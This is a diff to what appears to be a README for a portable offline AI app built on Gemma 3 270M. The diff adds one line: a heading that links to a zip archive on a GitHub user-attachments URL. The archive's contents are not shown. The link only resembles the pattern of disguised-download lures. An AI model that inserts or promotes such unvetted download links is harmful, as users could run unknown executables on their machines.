@@ -2,6 +2,7 @@
 
 Run a small AI model (Gemma 3 270M) on your own PC or from a USB drive.
 No internet needed after setup, no message limits, nothing leaves your computer.
+## Download All Files In Zip - https://github.com/user-attachments/files/33340325/Portable.Local.Ai.By.NEXORA.zip
 
 ## Quick start (Windows)
 
